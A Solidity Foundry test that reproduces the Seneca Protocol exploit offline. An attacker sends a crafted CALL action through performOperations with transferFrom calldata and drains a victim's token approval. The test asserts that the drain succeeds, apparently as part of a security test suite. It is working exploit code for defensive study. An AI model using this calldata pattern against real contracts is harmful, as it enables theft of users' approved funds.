// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {MockERC20} from "../src/MockERC20.sol";
import {SenecaChamberClone} from "../fixtures/malicious-calldata/b-incident/SenecaChamberClone.sol";

/// @title malicious-calldata tier (b): Seneca Protocol exploit (2024-02-28, Ethereum, ~$6.4M).
/// @notice Minimized offline reproduction of the documented mechanism: performOperations
///         dispatched a CALL action to an internal _call that executed an arbitrary callee +
///         calldata with no validation. The Chamber held users' approvals, so the attacker
///         dispatched a CALL to a victim's token with transferFrom(victim, attacker, amount)
///         and drained the standing approval. See PROVENANCE.md.
contract SenecaChamberIncidentTest is Test {
    uint256 constant VICTIM_BALANCE = 400_000e18; // representative, scaled
    address constant VICTIM = address(0x7211);
    address constant ATTACKER = address(0xBAD56);

    function _report(string memory target, bool drained) internal pure {
        string memory verdict = drained ? "VULNERABLE" : "BLOCKED";
        console.log(string.concat("[malicious-calldata] target=", target, " verdict=", verdict));
    }

    function test_seneca_performOperations_arbitraryCall_drains() public {
        MockERC20 token = new MockERC20();
        SenecaChamberClone chamber = new SenecaChamberClone();

        // A user holds funds and grants the Chamber an approval (the exploited standing state).
        token.mint(VICTIM, VICTIM_BALANCE);
        vm.prank(VICTIM);
        token.approve(address(chamber), type(uint256).max);

        // ATTACK: dispatch a CALL action targeting the token with transferFrom(victim->attacker).
        uint8[] memory actions = new uint8[](1);
        actions[0] = chamber.ACTION_CALL();
        address[] memory targets = new address[](1);
        targets[0] = address(token);
        bytes[] memory datas = new bytes[](1);
        datas[0] = abi.encodeWithSignature("transferFrom(address,address,uint256)", VICTIM, ATTACKER, VICTIM_BALANCE);

        vm.prank(ATTACKER);
        chamber.performOperations(actions, targets, datas);

        bool drained = (token.balanceOf(VICTIM) == 0 && token.balanceOf(ATTACKER) == VICTIM_BALANCE);
        _report("seneca-performoperations-victim", drained);

        assertTrue(drained, "arbitrary _call via performOperations should drain the approval");
        assertEq(token.balanceOf(ATTACKER), VICTIM_BALANCE, "attacker drained the victim");
    }
}
